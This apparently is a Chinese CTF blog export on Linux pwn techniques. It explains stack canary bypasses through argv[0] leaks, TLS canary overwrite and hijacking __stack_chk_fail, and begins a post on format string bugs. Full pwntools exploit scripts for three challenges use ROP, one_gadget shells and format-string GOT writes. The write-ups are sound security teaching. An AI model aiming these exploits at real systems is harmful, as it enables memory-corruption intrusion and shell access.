class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数 <code>__fortify_fail()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><p><code>__fortify_fail()</code> 调用函数 <code>__libc_message()</code> 打印出错误信息和 <code>argv[0]</code>。</p><p>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</unknown></p><p><strong>但这种方法在libc2.26中已经修复</strong>（网上我找的是2.26修复，但有一篇文章是2.25，存疑）</p><p>最后我们来看一下 libc-2.25 里的 <code>__stack_chk_fail</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br></pre></td></tr></table></figure><p>它使用了新函数 <code>__fortify_fail_abort()</code>，这个函数是在 <a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=ed421fca42fd9b4cab7c66e77894b8dd7ca57ed0" target="_blank" rel="noopener">BZ #12189</a> 这次提交中新增的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail_abort (<span class="built_in">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don't pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">                    <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg,</span><br><span class="line">                    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">                     ? __libc_argv[<span class="number">0</span>] : <span class="string">"&lt;unknown&gt;"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">true</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br><span class="line">libc_hidden_def (__fortify_fail_abort)</span><br></pre></td></tr></table></figure><p>函数 <code>__fortify_fail_abort()</code> 在第一个参数为 <code>false</code> 时不再进行栈回溯，直接以打印出字符串 <code>&lt;unknown&gt;</code> 结束，也就没有办法输出 <code>argv[0]</code> 了。</p><h3 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221200044056.png" alt="image-20210221200044056"></p><p>大概意思就是栈上读取flag.txt，然后让我们猜flag，但这里有fork就很可疑</p><p>来复习一下fork</p><blockquote><p>Unix/Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，<strong>但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</strong></p><p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p></blockquote><p><strong>先说一下思路，我们此时知道flag是在栈上的，无非就是泄露栈上的flag，但具体怎么做呢？</strong></p><p><strong>要想泄露栈上的地址，我们这里需要用到<code>__environ</code></strong></p><blockquote><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong></p><p>1、得到libc地址后，libc基址+_environ的偏移量=_environ的地址 在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量和libc库有关  </p><p>2、通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p></blockquote><ol><li>通过argv[0]泄露got，从而得到基址</li><li>泄露environ</li><li>泄露flag</li></ol><p>首先我们要知道get的变量和argv[0]的offset</p><p>可以看到是296</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp; __libc_argv[0]</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221223741272.png" alt="image-20210221223741272"></p><p>接下来我们还需要知道environ和flag的offset,是360</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221224236237.png" alt="image-20210221224236237"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27910</span>)</span><br><span class="line">elf = ELF(<span class="string">"./GUESS"</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">296</span> + p64(puts_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">environ = libc_base + libc.dump(<span class="string">'_environ'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">296</span> + p64(environ)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">environ = uu64(r(<span class="number">6</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">296</span> + p64(environ<span class="number">-360</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="3-4-覆盖-TLS-中储存的-Canary-值"><a href="#3-4-覆盖-TLS-中储存的-Canary-值" class="headerlink" title="3.4 覆盖 TLS 中储存的 Canary 值"></a>3.4 覆盖 TLS 中储存的 Canary 值</h2><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><blockquote><p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p><p>glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。</p></blockquote><h3 id="CTF2018-babystack"><a href="#CTF2018-babystack" class="headerlink" title="*CTF2018 babystack"></a>*CTF2018 babystack</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142851478.png" alt="image-20210222142851478"></p><p>说一下主要逻辑，创建一个新的线程，首先是读入size，然后进行读内容</p><p>简单看一下这里有栈溢出</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142625810.png" alt="image-20210222142625810"></p><p>接下来我们就可以利用上面的结论</p><ol><li>栈溢出覆盖返回地址，泄露libc基址</li><li>栈迁移到bss段</li><li>ROP</li></ol><p>先看一下canary</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222150721776.png" alt="image-20210222150721776"></p><p>看exp把</p><blockquote><p>不懂为什么/bin/sh本地可以，远程打不通，onegadget可以</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26593</span>)</span><br><span class="line"><span class="comment">#p = process('./bs')</span></span><br><span class="line">elf = ELF(<span class="string">"./bs"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.271.so'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">read_plt = elf.sym[<span class="string">'read'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">put_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">buf = <span class="number">0x602f00</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b'A'</span>*<span class="number">0x1010</span> + p64(buf)+ p64(pop_rdi) + p64(puts_got) + p64(put_plt) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(buf+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(read_plt) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">sl(str(<span class="number">0x2000</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">'A'</span>)</span><br><span class="line">s(payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\x7f'</span>,<span class="literal">False</span>)[<span class="number">-6</span>:])</span><br><span class="line">leak(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"><span class="comment"># sys = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + (libc.search("/bin/sh")).next()</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher('puts',puts)</span></span><br><span class="line"><span class="comment"># libc_base = puts - libc.dump('puts')</span></span><br><span class="line"><span class="comment"># leak("libc_base",libc_base)</span></span><br><span class="line"><span class="comment"># sys = libc_base + libc.dump('system')</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + libc.dump('str_bin_sh')</span></span><br><span class="line"><span class="comment">#payload = p64(pop_rdi) + p64(bin_sh) + p64(sys)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x4f322</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="3-5-劫持-stack-chk-fail函数"><a href="#3-5-劫持-stack-chk-fail函数" class="headerlink" title="3.5 劫持__stack_chk_fail函数"></a>3.5 劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以直接泄露canary了</p><h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222203954917.png" alt="image-20210222203954917"></p><p>基本思路</p><ol><li>劫持got表去backdoor</li></ol><blockquote><p>pwntools自动生成fmt是要看64位还是32位</p><p>所以需要改架构</p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25608</span>)</span><br><span class="line"><span class="comment">#p = process('./r2t4')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor = elf.sym[<span class="string">'backdoor'</span>]</span><br><span class="line">print(hex(backdoor))</span><br><span class="line"><span class="comment">#payload = b"%64c%9$hn%1510c%10$hnAAA" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;__stack_chk_fail:backdoor&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">'A'</span>)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-Canary&quot;&gt;&lt;a href=&quot;#0x01-Canary&quot; class=&quot;headerlink&quot; title=&quot;0x01 Canary&quot;&gt;&lt;/a&gt;0x01 Canary&lt;/h1&gt;&lt;p&gt;Canary 的意思是金丝雀,是一种用于对抗栈溢出攻击的技术，也叫做</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://pz1o.top/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://pz1o.top/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-15T14:12:39.000Z</published>
    <updated>2021-03-04T07:35:26.359Z</updated>
    
    <content type="html"><![CDATA[<p>总结一下格式化字符串漏洞</p><h1 id="0x01-格式化输出函数"><a href="#0x01-格式化输出函数" class="headerlink" title="0x01 格式化输出函数"></a>0x01 格式化输出函数</h1><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int prinf(const char *format,...);</span><br><span class="line">int fprintf(FILE *stream, const char *format,...);</span><br><span class="line">int dprintf(int fd,const char *format,...);</span><br><span class="line">int sprintf(char *str,const char *format,...);</span><br><span class="line">int snprintf(char *str, size_t size, const char *format,...);</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">printf</td><td style="text-align:center">输出到stdout</td></tr><tr><td style="text-align:center">fprintf</td><td style="text-align:center">输出到指定FILE流</td></tr><tr><td style="text-align:center">vprintf</td><td style="text-align:center">根据参数列表格式化输出到 stdout</td></tr><tr><td style="text-align:center">vfprintf</td><td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td style="text-align:center">sprintf</td><td style="text-align:center">输出到字符串</td></tr><tr><td style="text-align:center">snprintf</td><td style="text-align:center">输出指定字节数到字符串</td></tr><tr><td style="text-align:center">vsprintf</td><td style="text-align:center">根据参数列表格式化输出到字符串</td></tr><tr><td style="text-align:center">vsnprintf</td><td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td style="text-align:center">setproctitle</td><td style="text-align:center">设置 argv</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">输出日志</td></tr><tr><td style="text-align:center">err, verr, warn, vwarn 等</td><td style="text-align:center">…</td></tr></tbody></table></div><p><strong>格式化字符串的基本格式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><ul><li>parameter<ul><li>n$，获取格式化字符串中的指定参数</li></ul></li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li>type<ul><li>d/i，有符号整数</li><li>u，无符号整数</li><li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘%’字面值，不接受任何 flags, width。</li></ul></li></ul><p>举几个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%12c"</span>,<span class="string">'A'</span>);   <span class="comment">//"           A"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%12c%n"</span>,<span class="string">'A'</span>,&amp;n); <span class="comment">// n = 12;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%16s%n"</span>,<span class="string">"hello"</span>,&amp;n); <span class="comment">//n = 16</span></span><br><span class="line"><span class="comment">//           hello</span></span><br><span class="line"><span class="comment">//16</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%2$s %1$s"</span>,<span class="string">"Format"</span>,<span class="string">"Strings"</span>);  </span><br><span class="line"><span class="comment">//Strings Format</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%42c%1$n"</span>,&amp;n); </span><br><span class="line"><span class="comment">//                                         �</span></span><br><span class="line"><span class="number">42</span></span><br></pre></td></tr></table></figure><h1 